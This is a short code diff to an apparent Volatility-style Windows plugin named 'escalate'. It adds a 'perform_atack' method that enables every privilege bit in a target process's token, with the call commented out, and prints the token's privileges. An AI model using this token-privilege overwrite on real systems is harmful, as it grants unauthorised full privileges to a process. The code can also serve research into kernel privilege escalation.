@@ -56,6 +56,11 @@ class escalate(common.AbstractWindowsCommand):
         return obj.Object("_EPROCESS", offset=offset, vm=self._addrspace)
 
 
+    def perform_atack(self):
+        token = self._proc.get_token()
+        token.Privileges.Enabled = 0xFFFFFFFFFFFFFFFF
+
+
     def get_pid_from_name(self, name):
         for proc in win32.tasks.pslist(self._addrspace):
             if str(proc.ImageFileName) == name:
@@ -73,9 +78,11 @@ class escalate(common.AbstractWindowsCommand):
 
         self._proc = self.get_target_proc(pid)
 
+        # self.perform_atack()
+        print self._proc.get_token().Privileges.Enabled
         # outfd.write("Pid: {}\n".format(pid))
-        outfd.write("Current context: {0} @ {1:#x}, pid={2}, ppid={3} DTB={4:#x}\n".format(self._proc.ImageFileName,
-                                                                                         self._proc.obj_offset,
-                                                                                         self._proc.UniqueProcessId.v(),
-                                                                                         self._proc.InheritedFromUniqueProcessId.v(),
-                                                                                         self._proc.Pcb.DirectoryTableBase.v()).format(pid))
+        # outfd.write("Current context: {0} @ {1:#x}, pid={2}, ppid={3} DTB={4:#x}\n".format(self._proc.ImageFileName,
+        #                                                                                  self._proc.obj_offset,
+        #                                                                                  self._proc.UniqueProcessId.v(),
+        #                                                                                  self._proc.InheritedFromUniqueProcessId.v(),
+        #                                                                                  self._proc.Pcb.DirectoryTableBase.v()).format(pid))
